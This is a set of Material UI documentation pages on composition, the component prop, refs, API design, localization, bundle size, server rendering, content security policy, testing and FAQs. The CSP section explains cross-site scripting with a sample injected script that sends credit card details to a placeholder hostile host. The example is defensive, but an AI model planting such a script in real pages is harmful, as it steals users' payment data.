---
title: Mui Guides And Patterns
source: mui.com/material-ui
syllabus_weeks: [9, 10, 12]
topics: [composition, component prop, ref forwarding, API design, localization, content security policy, bundle size, server rendering, testing, FAQ]
---



# Composition

# Composition

Material UI tries to make composition as easy as possible.

## Wrapping components

To provide maximum flexibility and performance, Material UI needs a way to know the nature of the child elements a component receives.
To solve this problem, we tag some of the components with a `muiName` static property when needed.

You may, however, need to wrap a component in order to enhance it, which can conflict with the `muiName` solution.
If you wrap a component, verify if that component has this static property set.

If you encounter this issue, you need to use the same tag for your wrapping component that is used with the wrapped component.
In addition, you should forward the props, as the parent component may need to control the wrapped components props.

Let's see an example:

```jsx
const WrappedIcon = (props) => <Icon {...props} />;
WrappedIcon.muiName = Icon.muiName;
```


### Forwarding slot props

Use the `mergeSlotProps` utility function to merge custom props with the slot props.
If the arguments are functions then they'll be resolved before merging, and the result from the first argument will override the second.

Special properties that merged between the two arguments are listed below:

- `className`: values are concatenated rather than overriding one another.

  In the snippet below, the `custom-tooltip-popper` class is applied to the Tooltip's popper slot.

  ```jsx
  import Tooltip, { TooltipProps } from '@mui/material/Tooltip';
  import { mergeSlotProps } from '@mui/material/utils';

  export const CustomTooltip = (props: TooltipProps) => {
    const { children, title, sx: sxProps } = props;

    return (
      <Tooltip
        {...props}
        title={<Box sx={{ p: 4 }}>{title}</Box>}
        slotProps={{
          ...props.slotProps,
          popper: mergeSlotProps(props.slotProps?.popper, {
            className: 'custom-tooltip-popper',
            disablePortal: true,
            placement: 'top',
          }),
        }}
      >
        {children}
      </Tooltip>
    );
  };
  ```

  If you added another `className` via the `slotProps` prop on the Custom Tooltip—as shown below—then both would be present on the rendered popper slot:

  ```js
  <CustomTooltip slotProps={{ popper: { className: 'foo' } }} />
  ```

  The popper slot in the original example would now have both classes applied to it, in addition to any others that may be present: `"[…] custom-tooltip-popper foo"`.

- `style`: object are shallow merged rather than replacing one another. The style keys from the first argument have higher priority.
- `sx`: values are concatenated into an array.
- `^on[A-Z]` event handlers: these functions are composed between the two arguments.

  ```js
  mergeSlotProps(props.slotProps?.popper, {
    onClick: (event) => {}, // composed with the `slotProps?.popper?.onClick`
    createPopper: (popperOptions) => {}, // overridden by the `slotProps?.popper?.createPopper`
  });
  ```

## Component prop

Material UI allows you to change the root element that will be rendered via a prop called `component`.

For example, by default a `List` component will render a `<ul>` element.
This can be changed by passing a [React component](https://react.dev/reference/react/Component) to the `component` prop.
The following example renders the `List` component with a `<menu>` element as root element instead:

```jsx
<List component="menu">
  <ListItem>
    <ListItemButton>
      <ListItemText primary="Trash" />
    </ListItemButton>
  </ListItem>
  <ListItem>
    <ListItemButton>
      <ListItemText primary="Spam" />
    </ListItemButton>
  </ListItem>
</List>
```

This pattern is very powerful and allows for great flexibility, as well as a way to interoperate with other libraries, such as your favorite routing or forms library.

### Passing other React components

You can pass any other React component to `component` prop. For example, you can pass `Link` component from `react-router`:

```tsx
import { Link } from 'react-router';
import Button from '@mui/material/Button';

function Demo() {
  return (
    <Button component={Link} to="/react-router">
      React router link
    </Button>
  );
}
```

### With TypeScript

To be able to use the `component` prop, the type of the props should be used with type arguments. Otherwise, the `component` prop will not be present.

The examples below use `TypographyProps` but the same will work for any component which has props defined with `OverrideProps`.

```ts
import { TypographyProps } from '@mui/material/Typography';

function CustomComponent(props: TypographyProps<'a', { component: 'a' }>) {
  /* ... */
}
// ...
<CustomComponent component="a" />;
```

Now the `CustomComponent` can be used with a `component` prop which should be set to `'a'`.
In addition, the `CustomComponent` will have all props of a `<a>` HTML element.
The other props of the `Typography` component will also be present in props of the `CustomComponent`.

You can find a code example with the Button and react-router in [these demos](/material-ui/integrations/routing/#component-prop).

### Generic

It's also possible to have a generic custom component which accepts any React component, including [built-in components](https://react.dev/reference/react-dom/components/common).

```ts
function GenericCustomComponent<C extends React.ElementType>(
  props: TypographyProps<C, { component?: C }>,
) {
  /* ... */
}
```

If the `GenericCustomComponent` is used with a `component` prop provided, it should also have all props required by the provided component.

```ts
function ThirdPartyComponent({ prop1 }: { prop1: string }) {
  /* ... */
}
// ...
<GenericCustomComponent component={ThirdPartyComponent} prop1="some value" />;
```

The `prop1` became required for the `GenericCustomComponent` as the `ThirdPartyComponent` has it as a requirement.

Not every component fully supports any component type you pass in.
If you encounter a component that rejects its `component` props in TypeScript, please open an issue.
There is an ongoing effort to fix this by making component props generic.

## Caveat with refs

This section covers caveats when using a custom component as `children` or for the
`component` prop.

Some of the components need access to the DOM node. This was previously possible
by using `ReactDOM.findDOMNode`. This function is deprecated in favor of `ref` and
ref forwarding. However, only the following component types can be given a `ref`:

- Any Material UI component
- class components, that is `React.Component` or `React.PureComponent`
- DOM (or host) components, for example `div` or `button`
- [React.forwardRef components](https://react.dev/reference/react/forwardRef)
- [React.lazy components](https://react.dev/reference/react/lazy)
- [React.memo components](https://react.dev/reference/react/memo)

If you don't use one of the above types when using your components in conjunction with Material UI, you might see a warning from
React in your console similar to:

> **Warning:**
>
> Function components cannot be given refs. Attempts to access this ref will fail. Did you mean to use React.forwardRef()?


Note that you will still get this warning for `lazy` and `memo` components if their wrapped component can't hold a ref.
In some instances, an additional warning is issued to help with debugging, similar to:

> **Warning:**
>
> Invalid prop `component` supplied to `ComponentName`. Expected an element type that can hold a ref.


Only the two most common use cases are covered. For more information see [this section in the official React docs](https://react.dev/reference/react/forwardRef).

```diff
-const MyButton = () => <div role="button" />;
+const MyButton = React.forwardRef((props, ref) =>
+  <div role="button" {...props} ref={ref} />);

 <Button component={MyButton} />;
```

```diff
-const SomeContent = props => <div {...props}>Hello, World!</div>;
+const SomeContent = React.forwardRef((props, ref) =>
+  <div {...props} ref={ref}>Hello, World!</div>);

 <Tooltip title="Hello again."><SomeContent /></Tooltip>;
```

To find out if the Material UI component you're using has this requirement, check
out the props API documentation for that component. If you need to forward refs
the description will link to this section.

### Caveat with StrictMode

If you use class components for the cases described above you will still see
warnings in `React.StrictMode`.
`ReactDOM.findDOMNode` is used internally for backwards compatibility.
You can use `React.forwardRef` and a designated prop in your class component to forward the `ref` to a DOM component.
Doing so should not trigger any more warnings related to the deprecation of `ReactDOM.findDOMNode`.

```diff
 class Component extends React.Component {
   render() {
-    const { props } = this;
+    const { forwardedRef, ...props } = this.props;
     return <div {...props} ref={forwardedRef} />;
   }
 }

-export default Component;
+export default React.forwardRef((props, ref) => <Component {...props} forwardedRef={ref} />);
```


# Api

# API design approach

We have learned a great deal regarding how Material UI is used, and the v1 rewrite allowed us to completely rethink the component API.

> API design is hard because you can make it seem simple but it's actually deceptively complex, or make it actually simple but seem complex.
> [@sebmarkbage](https://x.com/sebmarkbage/status/728433349337841665)

As Sebastian Markbage [pointed out](https://2014.jsconf.eu/speakers/sebastian-markbage-minimal-api-surface-area-learning-patterns-instead-of-frameworks.html), no abstraction is superior to wrong abstractions.
We are providing low-level components to maximize composition capabilities.

## Composition

You may have noticed some inconsistency in the API regarding composing components.
To provide some transparency, we have been using the following rules when designing the API:

1. Using the `children` prop is the idiomatic way to do composition with React.
2. Sometimes we only need limited child composition, for instance when we don't need to allow child order permutations.
   In this case, providing explicit props makes the implementation simpler and more performant; for example, the `Tab` takes an `icon` and a `label` prop.
3. API consistency matters.

## Rules

Aside from the above composition trade-off, we enforce the following rules:

### Spread

Props supplied to a component which are not explicitly documented are spread to the root element;
for instance, the `className` prop is applied to the root.

Now, let's say you want to disable the ripples on the `MenuItem`.
You can take advantage of the spread behavior:

```jsx
<MenuItem disableRipple />
```

The `disableRipple` prop will flow this way: [`MenuItem`](/material-ui/api/menu-item/) > [`ListItem`](/material-ui/api/list-item/) > [`ButtonBase`](/material-ui/api/button-base/).

### Native properties

We avoid documenting native properties supported by the DOM like [`className`](/material-ui/customization/how-to-customize/#overriding-styles-with-class-names).

### CSS Classes

All components accept a [`classes`](/material-ui/customization/how-to-customize/#overriding-styles-with-class-names) prop to customize the styles.
The classes design answers two constraints:
to make the classes structure as simple as possible, while sufficient to implement the Material Design guidelines.

- The class applied to the root element is always called `root`.
- All the default styles are grouped in a single class.
- The classes applied to non-root elements are prefixed with the name of the element, for example `paperWidthXs` in the Dialog component.
- The variants applied by a boolean prop **aren't** prefixed, for example the `rounded` class
  applied by the `rounded` prop.
- The variants applied by an enum prop **are** prefixed, for example the `colorPrimary` class
  applied by the `color="primary"` prop.
- A variant has **one level of specificity**.
  The `color` and `variant` props are considered a variant.
  The lower the style specificity is, the simpler it is to override.
- We increase the specificity for a variant modifier.
  We already **have to do it** for the pseudo-classes (`:hover`, `:focus`, etc.).
  It allows much more control at the cost of more boilerplate.
  Hopefully, it's also more intuitive.

```js
const styles = {
  root: {
    color: green[600],
    '&$checked': {
      color: green[500],
    },
  },
  checked: {},
};
```

### Nested components

Nested components inside a component have:

- their own flattened props when these are key to the top level component abstraction,
  for instance an `id` prop for the `Input` component.
- their own `xxxProps` prop when users might need to tweak the internal render method's subcomponents,
  for instance, exposing the `inputProps` and `InputProps` props on components that use `Input` internally.
- their own `xxxComponent` prop for performing component injection.
- their own `xxxRef` prop when you might need to perform imperative actions,
  for instance, exposing an `inputRef` prop to access the native `input` on the `Input` component.
  This helps answer the question ["How can I access the DOM element?"](/material-ui/getting-started/faq/#how-can-i-access-the-dom-element)

### Prop naming

- **Boolean**
  - The default value of a boolean prop should be `false`. This allows for better shorthand notation. Consider an example of an input that is enabled by default. How should you name the prop that controls this state? It should be called `disabled`:

    ```jsx
    ❌ <Input enabled={false} />
    ✅ <Input disabled />
    ```

  - If the name of the boolean is a single word, it should be an adjective or a noun rather than a verb. This is because props describe _states_ and not _actions_. For example an input prop can be controlled by a state, which wouldn't be described with a verb:

    ```jsx
    const [disabled, setDisabled] = React.useState(false);

    ❌ <Input disable={disabled} />
    ✅ <Input disabled={disabled} />
    ```

### Controlled components

Most controlled components are controlled by the `value` and the `onChange` props.
The `open` / `onClose` / `onOpen` combination is also used for displaying related state.
In the cases where there are more events, the noun comes first, and then the verb—for example: `onPageChange`, `onRowsChange`.

> **Info:**
>
> - A component is **controlled** when it's managed by its parent using props.
> - A component is **uncontrolled** when it's managed by its own local state.
> 
> Learn more about controlled and uncontrolled components in the [React documentation](https://react.dev/learn/sharing-state-between-components#controlled-and-uncontrolled-components).


### boolean vs. enum

There are two options to design the API for the variations of a component: with a _boolean_; or with an _enum_.
For example, let's take a button that has different types. Each option has its pros and cons:

- Option 1 _boolean_:

  ```tsx
  type Props = {
    contained: boolean;
    fab: boolean;
  };
  ```

  This API enables the shorthand notation:
  `<Button>`, `<Button contained />`, `<Button fab />`.

- Option 2 _enum_:

  ```tsx
  type Props = {
    variant: 'text' | 'contained' | 'fab';
  };
  ```

  This API is more verbose:
  `<Button>`, `<Button variant="contained">`, `<Button variant="fab">`.

  However, it prevents an invalid combination from being used,
  bounds the number of props exposed,
  and can easily support new values in the future.

The Material UI components use a combination of the two approaches according to the following rules:

- A _boolean_ is used when **2** possible values are required.
- An _enum_ is used when **> 2** possible values are required, or if there is the possibility that additional possible values may be required in the future.

Going back to the previous button example; since it requires 3 possible values, we use an _enum_.

### Ref

The `ref` is forwarded to the root element. This means that, without changing the rendered root element
via the `component` prop, it is forwarded to the outermost DOM element which the component
renders. If you pass a different component via the `component` prop, the ref will be attached
to that component instead.

## Glossary

- **host component**: a DOM node type in the context of `react-dom`, for example a `'div'`. See also [React Implementation Notes](https://legacy.reactjs.org/docs/implementation-notes.html#mounting-host-elements).
- **host element**: a DOM node in the context of `react-dom`, for example an instance of `window.HTMLDivElement`.
- **outermost**: The first component when reading the component tree from top to bottom, that is breadth-first search.
- **root component**: the outermost component that renders a host component.
- **root element**: the outermost element that renders a host component.


# Localization

# Localization

Localization (also referred to as "l10n") is the process of adapting a product or content to a specific locale or market.

The default locale of Material UI is English (United States). If you want to use other locales, follow the instructions below.

## Locale text

Use the theme to configure the locale text globally:

```jsx
import { createTheme, ThemeProvider } from '@mui/material/styles';
import { zhCN } from '@mui/material/locale';

const theme = createTheme(
  {
    palette: {
      primary: { main: '#1976d2' },
    },
  },
  zhCN,
);

<ThemeProvider theme={theme}>
  <App />
</ThemeProvider>;
```

### Example


> **Warning:**
>
> The [Data Grid and Data Grid Pro](/x/react-data-grid/) components have their own [localization](/x/react-data-grid/localization/).


### Supported locales

| Locale                  | BCP 47 language tag | Import name |
| :---------------------- | :------------------ | :---------- |
| Amharic                 | am-ET               | `amET`      |
| Arabic (Egypt)          | ar-EG               | `arEG`      |
| Arabic (Saudi Arabia)   | ar-SA               | `arSA`      |
| Arabic (Sudan)          | ar-SD               | `arSD`      |
| Armenian                | hy-AM               | `hyAM`      |
| Azerbaijani             | az-AZ               | `azAZ`      |
| Bangla                  | bn-BD               | `bnBD`      |
| Bulgarian               | bg-BG               | `bgBG`      |
| Catalan                 | ca-ES               | `caES`      |
| Chinese (Hong Kong)     | zh-HK               | `zhHK`      |
| Chinese (Simplified)    | zh-CN               | `zhCN`      |
| Chinese (Taiwan)        | zh-TW               | `zhTW`      |
| Croatian                | hr-HR               | `hrHR`      |
| Czech                   | cs-CZ               | `csCZ`      |
| Danish                  | da-DK               | `daDK`      |
| Dutch                   | nl-NL               | `nlNL`      |
| English (United States) | en-US               | `enUS`      |
| Estonian                | et-EE               | `etEE`      |
| Finnish                 | fi-FI               | `fiFI`      |
| French                  | fr-FR               | `frFR`      |
| German                  | de-DE               | `deDE`      |
| Greek                   | el-GR               | `elGR`      |
| Hebrew                  | he-IL               | `heIL`      |
| Hindi                   | hi-IN               | `hiIN`      |
| Hungarian               | hu-HU               | `huHU`      |
| Icelandic               | is-IS               | `isIS`      |
| Indonesian              | id-ID               | `idID`      |
| Italian                 | it-IT               | `itIT`      |
| Japanese                | ja-JP               | `jaJP`      |
| Khmer                   | kh-KH               | `khKH`      |
| Kazakh                  | kk-KZ               | `kkKZ`      |
| Korean                  | ko-KR               | `koKR`      |
| Kurdish (Central)       | ku-CKB              | `kuCKB`     |
| Macedonian              | mk-MK               | `mkMK`      |
| Myanmar                 | my-MY               | `myMY`      |
| Malay                   | ms-MS               | `msMS`      |
| Nepali                  | ne-NP               | `neNP`      |
| Norwegian (bokmål)      | nb-NO               | `nbNO`      |
| Norwegian (nynorsk)     | nn-NO               | `nnNO`      |
| Pashto (Afghanistan)    | ps-AF               | `psAF`      |
| Persian                 | fa-IR               | `faIR`      |
| Polish                  | pl-PL               | `plPL`      |
| Portuguese              | pt-PT               | `ptPT`      |
| Portuguese (Brazil)     | pt-BR               | `ptBR`      |
| Romanian                | ro-RO               | `roRO`      |
| Russian                 | ru-RU               | `ruRU`      |
| Serbian                 | sr-RS               | `srRS`      |
| Sinhalese               | si-LK               | `siLK`      |
| Slovak                  | sk-SK               | `skSK`      |
| Spanish                 | es-ES               | `esES`      |
| Swedish                 | sv-SE               | `svSE`      |
| Thai                    | th-TH               | `thTH`      |
| Turkish                 | tr-TR               | `trTR`      |
| Tagalog                 | tl-TL               | `tlTL`      |
| Ukrainian               | uk-UA               | `ukUA`      |
| Urdu (Pakistan)         | ur-PK               | `urPK`      |
| Vietnamese              | vi-VN               | `viVN`      |

<!-- #target-branch-reference -->

You can [find the source](https://github.com/mui/material-ui/blob/master/packages/mui-material/src/locale/index.ts) in the GitHub repository.

To create your own translation, or to customize the English text, copy this file to your project, make any changes needed and import the locale from there.

Please do consider contributing new translations back to Material UI by opening a pull request.
However, Material UI aims to support the [100 most common](https://en.wikipedia.org/wiki/List_of_languages_by_number_of_native_speakers) [locales](https://www.ethnologue.com/insights/ethnologue200/), we might not accept contributions for locales that are not frequently used, for instance `gl-ES` that has "only" 2.5 million native speakers.

## RTL Support

Right-to-left languages such as Arabic, Persian, Hebrew, Kurdish, and others are supported.
Follow [this guide](/material-ui/customization/right-to-left/) to use them.


# Minimizing Bundle Size

# Minimizing bundle size

Learn how to reduce your bundle size and improve development performance by avoiding costly import patterns.

## Bundle size matters

Material UI's maintainers take bundle size very seriously. Size snapshots are taken on every commit for every package and critical parts of those packages. Combined with [dangerJS](https://danger.systems/js/), we can inspect [detailed bundle size changes](https://github.com/mui/material-ui/pull/14638#issuecomment-466658459) on every Pull Request.

## Avoid barrel imports

Modern bundlers already tree-shake unused code in production builds, so you don't need to worry about it when using top-level imports. The real performance concern is during **development**, where **barrel imports** like `@mui/material` or `@mui/icons-material` can cause significantly **slower startup and rebuild times**.

```js
// ✅ Preferred
import Button from '@mui/material/Button';
import TextField from '@mui/material/TextField';
```

Instead of:

```js
// ❌ Slower in dev
import { Button, TextField } from '@mui/material';
```

This is especially true when using `@mui/icons-material`, where named imports can be up to six times slower than default path-based imports:

```js
// 🐌 Slower in dev
import { Delete } from '@mui/icons-material';

// 🚀 Faster in dev
import Delete from '@mui/icons-material/Delete';
```

This approach avoids loading unnecessary parts of the package and does not require any special configuration. It is also the default used in all our official examples and demos.

If you have existing barrel imports in your codebase, use the `path-imports` [codemod](https://github.com/mui/material-ui/tree/HEAD/packages/mui-codemod/README.md#path-imports) below to migrate your code:

```bash
npx @mui/codemod@latest v5.0.0/path-imports <path>
```

## Enforce best practices with ESLint

To prevent accidental deep imports, you can use the `no-restricted-imports` rule in your ESLint configuration:

```json
// .eslintrc
{
  "rules": {
    "no-restricted-imports": [
      "error",
      {
        "patterns": [{ "regex": "^@mui/[^/]+$" }]
      }
    ]
  }
}
```

## Avoid VS Code auto-importing from barrel files

To prevent VS Code from automatically importing from `@mui/material`, you can use the `typescript.autoImportSpecifierExcludeRegexes` in the VS Code project configuration:

```json
// .vscode/settings.json
{
  "typescript.preferences.autoImportSpecifierExcludeRegexes": ["^@mui/[^/]+$"]
}
```

## Using Next.js 13.5 or later?

If you're on **Next.js 13.5 or newer**, you're in good hands. These versions include automatic import optimization via the `optimizePackageImports` option. This removes the need for manual configuration or Babel plugins to optimize imports.

## Using parcel

Parcel, by default, doesn't resolve package.json `"exports"`. This makes it always resolve to the commonjs version of our library. To make it optimally make use of our ESM version, make sure to [enable the `packageExports` option](https://parceljs.org/features/dependency-resolution/#enabling-package-exports).

```json
// ./package.json
{
  "@parcel/resolver-default": {
    "packageExports": true
  }
}
```


# Server Rendering

# Server rendering

The most common use case for server-side rendering is to handle the initial render when a user (or search engine crawler) first requests your app.

When the server receives the request, it renders the required component(s) into an HTML string and then sends it as a response to the client.
From that point on, the client takes over rendering duties.

## Material UI on the server

Material UI was designed from the ground-up with the constraint of rendering on the server, but it's up to you to make sure it's correctly integrated.
It's important to provide the page with the required CSS, otherwise the page will render with just the HTML then wait for the CSS to be injected by the client, causing it to flicker (FOUC).
To inject the style down to the client, we need to:

1. Create a fresh, new [`emotion cache`](https://emotion.sh/docs/@emotion/cache) instance on every request.
2. Render the React tree with the server-side collector.
3. Pull the CSS out.
4. Pass the CSS along to the client.

On the client-side, the CSS will be injected a second time before removing the server-side injected CSS.

## Setting up

In the following recipe, we are going to look at how to set up server-side rendering.

### The theme

Create a theme that will be shared between the client and the server:

```js title="theme.js"
import { createTheme } from '@mui/material/styles';
import { red } from '@mui/material/colors';

// Create a theme instance.
const theme = createTheme({
  palette: {
    primary: {
      main: '#556cd6',
    },
    secondary: {
      main: '#19857b',
    },
    error: {
      main: red.A400,
    },
  },
});

export default theme;
```

### The server-side

The following is the outline for what the server-side is going to look like.
We are going to set up an [Express middleware](https://expressjs.com/en/guide/using-middleware.html) using [app.use](https://expressjs.com/en/api.html) to handle all requests that come into the server.
If you're unfamiliar with Express or middleware, know that the `handleRender` function will be called every time the server receives a request.

```js title="server.js"
import express from 'express';

// We are going to fill these out in the sections to follow.
function renderFullPage(html, css) {
  /* ... */
}

function handleRender(req, res) {
  /* ... */
}

const app = express();

// This is fired every time the server-side receives a request.
app.use(handleRender);

const port = 3000;
app.listen(port);
```

### Handling the request

The first thing that we need to do on every request is to create a new `emotion cache`.

When rendering, we will wrap `App`, the root component,
inside a [`CacheProvider`](https://emotion.sh/docs/cache-provider) and [`ThemeProvider`](https://v6.mui.com/system/styles/api/#themeprovider) to make the style configuration and the `theme` available to all components in the component tree.

The key step in server-side rendering is to render the initial HTML of the component **before** we send it to the client-side. To do this, we use [ReactDOMServer.renderToString()](https://react.dev/reference/react-dom/server/renderToString).

Material UI uses Emotion as its default styled engine.
We need to extract the styles from the Emotion instance.
For this, we need to share the same cache configuration for both the client and server:

```js title="createEmotionCache.js"
import createCache from '@emotion/cache';

export default function createEmotionCache() {
  return createCache({ key: 'css' });
}
```

With this we are creating a new Emotion cache instance and using this to extract the critical styles for the HTML as well.

We will see how this is passed along in the `renderFullPage` function.

```jsx
import express from 'express';
import * as React from 'react';
import * as ReactDOMServer from 'react-dom/server';
import CssBaseline from '@mui/material/CssBaseline';
import { ThemeProvider } from '@mui/material/styles';
import { CacheProvider } from '@emotion/react';
import createEmotionServer from '@emotion/server/create-instance';
import App from './App';
import theme from './theme';
import createEmotionCache from './createEmotionCache';

function handleRender(req, res) {
  const cache = createEmotionCache();
  const { extractCriticalToChunks, constructStyleTagsFromChunks } =
    createEmotionServer(cache);

  // Render the component to a string.
  const html = ReactDOMServer.renderToString(
    <CacheProvider value={cache}>
      <ThemeProvider theme={theme}>
        {/* CssBaseline kickstart an elegant, consistent, and simple baseline
            to build upon. */}
        <CssBaseline />
        <App />
      </ThemeProvider>
    </CacheProvider>,
  );

  // Grab the CSS from emotion
  const emotionChunks = extractCriticalToChunks(html);
  const emotionCss = constructStyleTagsFromChunks(emotionChunks);

  // Send the rendered page back to the client.
  res.send(renderFullPage(html, emotionCss));
}

const app = express();

app.use('/build', express.static('build'));

// This is fired every time the server-side receives a request.
app.use(handleRender);

const port = 3000;
app.listen(port);
```

### Inject initial component HTML and CSS

The final step on the server-side is to inject the initial component HTML and CSS into a template to be rendered on the client-side.

```js
function renderFullPage(html, css) {
  return `
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8" />
        <title>My page</title>
        ${css}
        <meta name="viewport" content="initial-scale=1, width=device-width" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link
          rel="stylesheet"
          href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
        />
      </head>
      <body>
        <div id="root">${html}</div>
      </body>
    </html>
  `;
}
```

### The client-side

The client-side is straightforward.
All we need to do is use the same cache configuration as the server-side.
Let's take a look at the client file:

```jsx title="client.js"
import * as React from 'react';
import * as ReactDOM from 'react-dom';
import CssBaseline from '@mui/material/CssBaseline';
import { ThemeProvider } from '@mui/material/styles';
import { CacheProvider } from '@emotion/react';
import App from './App';
import theme from './theme';
import createEmotionCache from './createEmotionCache';

const cache = createEmotionCache();

function Main() {
  return (
    <CacheProvider value={cache}>
      <ThemeProvider theme={theme}>
        {/* CssBaseline kickstart an elegant, consistent, and simple baseline
            to build upon. */}
        <CssBaseline />
        <App />
      </ThemeProvider>
    </CacheProvider>
  );
}

ReactDOM.hydrateRoot(document.querySelector('#root'), <Main />);
```

## Reference implementations

Here is [the reference implementation of this tutorial](https://github.com/mui/material-ui/tree/HEAD/examples/material-ui-express-ssr).
You can more SSR implementations in the GitHub repository under the `/examples` folder, see [the other examples](/material-ui/getting-started/example-projects/).


# Content Security Policy

# Content Security Policy (CSP)

This section covers the details of setting up a CSP.

## What is CSP and why is it useful?

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).

## How does one implement CSP?

### Server-Side Rendering (SSR)

To use CSP with Material UI (and Emotion), you need to use a nonce.
A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import crypto from 'node:crypto';

const nonce = crypto.randomBytes(16).toString('base64'); // 128 bits of entropy
```

This generates a value that satisfies the [W3C CSP specification](https://w3c.github.io/webappsec-csp/#security-nonces) guidelines.

You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tags on the server.

```jsx
<style
  data-emotion={`${style.key} ${style.ids.join(' ')}`}
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: style.css }}
/>
```

Then, you must pass this nonce to Emotion's cache so it can add it to subsequent `<style>`.

> **Warning:**
>
> If you were using `StyledEngineProvider` with `injectFirst`, you will need to replace it with `CacheProvider` from Emotion and add the `prepend: true` option.


```js
const cache = createCache({
  key: 'my-prefix-key',
  nonce: nonce,
  prepend: true,
});

function App(props) {
  return (
    <CacheProvider value={cache}>
      <Home />
    </CacheProvider>
  );
}
```

### CSP in Vite

When deploying a CSP using Vite, there are specific configurations you must set up due to Vite's internal handling of assets and modules.
See [Vite Features—Content Security Policy](https://vite.dev/guide/features.html#content-security-policy-csp) for complete details.

### Next.js Pages Router

For the Next.js Pages Router, after [setting up a nonce](https://nextjs.org/docs/app/guides/content-security-policy#nonces), pass it to the Emotion cache in two places:

1. In `_document.tsx`:

```tsx
import {
  DocumentHeadTags,
  documentGetInitialProps,
  createEmotionCache,
} from '@mui/material-nextjs/v15-pagesRouter';
// other imports

type Props = DocumentInitialProps & DocumentHeadTagsProps & { nonce?: string };

export default function MyDocument(props: Props) {
  const { nonce } = props;

  return (
    <Html lang="en" className={roboto.className}>
      <Head>
        {/*...*/}
        <meta name="csp-nonce" content={nonce} />
        <DocumentHeadTags {...props} nonce={nonce} />
      </Head>
      <body>
        {/*...*/}
        <NextScript nonce={nonce} />
      </body>
    </Html>
  );
}

MyDocument.getInitialProps = async (ctx: DocumentContext) => {
  const { req } = ctx;
  const nonce = req?.headers['x-nonce'];
  if (typeof nonce !== 'string') {
    throw new Error('"nonce" header is missing');
  }

  const emotionCache = createEmotionCache({ nonce });
  const finalProps = await documentGetInitialProps(ctx, {
    emotionCache,
  });

  return { ...finalProps, nonce };
};
```

2. In `_app.tsx` (if you're setting up the `AppCacheProvider`):

```tsx
import { createEmotionCache } from '@mui/material-nextjs/v15-pagesRouter';
// other imports

export default function MyApp(props: AppProps & { nonce: string }) {
  const { Component, pageProps, nonce } = props;

  const emotionCache = useMemo(() => {
    const nonce = props.nonce || getNonce();

    return createEmotionCache({ nonce });
  }, [props.nonce]);

  return (
    <AppCacheProvider {...props} emotionCache={emotionCache}>
      {/* ... */}
    </AppCacheProvider>
  );
}

function getNonce(headers?: Record<string, string | string[] | undefined>) {
  if (headers) {
    return headers['x-nonce'] as string;
  }

  if (typeof document !== 'undefined') {
    const nonceMeta = document.querySelector('meta[name="csp-nonce"]');
    if (nonceMeta) {
      return nonceMeta.getAttribute('content') || undefined;
    }
  }

  return undefined;
}

MyApp.getInitialProps = async (appContext: AppContext) => {
  const nonce = getNonce(appContext.ctx?.req?.headers);
  if (typeof nonce !== 'string') {
    throw new Error('"nonce" header is missing');
  }

  return { ...otherProps, nonce };
};
```

### styled-components

The configuration of the nonce is not straightforward, but you can follow [this issue](https://github.com/styled-components/styled-components/issues/2363) for more insights.


# Testing

# Testing

Write tests to prevent regressions and write better code.

## Userspace

It's generally recommended to test your application without tying the tests too closely to Material UI.
This is how Material UI components are tested internally.
A library that has a first-class API for this approach is [`@testing-library/react`](https://testing-library.com/docs/react-testing-library/intro/).

For example, when rendering a `TextField` your test should not need to query for the specific Material UI instance of the `TextField` but rather for the `input`, or `[role="textbox"]`.

By not relying on the React component tree you make your test more robust against internal changes in Material UI or, if you need snapshot testing, adding additional wrapper components such as context providers.
We don't recommend snapshot testing though.
["Effective snapshot testing" by Kent C. Dodds](https://kentcdodds.com/blog/effective-snapshot-testing) goes into more details why snapshot testing might be misleading for React component tests.

## Internal

We have **a wide range** of tests for Material UI so we can
iterate with confidence on the components, for instance, the visual regression tests provided by [Argos](https://argos-ci.com) have proven to be really helpful.
To learn more about the internal tests, you can have a look at the [README](https://github.com/mui/material-ui/blob/HEAD/test/README.md).


# Faq

# Frequently Asked Questions

Stuck on a particular problem? Check some of these common gotchas first in the FAQ.

If you still can't find what you're looking for, you can refer to our [support page](/material-ui/getting-started/support/).

## MUI is an awesome organization. How can I support it?

There are many ways to support us:

- **Spread the word**. Evangelize MUI's products by [linking to mui.com](https://mui.com/) on your website—every backlink matters.
  Follow us on [X](https://x.com/MUI_hq), like and retweet the important news. Or just talk about us with your friends.
- **Give us feedback**. Tell us what is going well or where there is improvement opportunities. Please upvote (👍) the issues that you are the most interested in seeing solved.
- **Help new users**. You can answer questions on
  [Stack Overflow](https://stackoverflow.com/questions/tagged/material-ui).
- **Make changes happen**.
  - Edit the documentation. At the bottom of every page, you can find an "Edit this page" button.
  - Report bugs or missing features by [creating an issue](https://github.com/mui/material-ui/issues/new).
  - Review and comment on existing [pull requests](https://github.com/mui/material-ui/pulls?q=is%3Apr) and [issues](https://github.com/mui/material-ui/issues?q=is%3Aopen+is%3Aclosed).
  - [Improve our documentation](https://github.com/mui/material-ui/tree/HEAD/docs), fix bugs, or add features by [submitting a pull request](https://github.com/mui/material-ui/pulls).
- **Support us financially on [Open Collective](https://opencollective.com/mui-org)**.
  If you use Material UI in a commercial project and would like to support its continued development by becoming a Sponsor, or in a side or hobby project and would like to become a Backer, you can do so through Open Collective.
  All funds donated are managed transparently, and Sponsors receive recognition in the README and on the homepage.

## Why do the fixed positioned elements move when a modal is opened?

Scrolling is blocked as soon as a modal is opened.
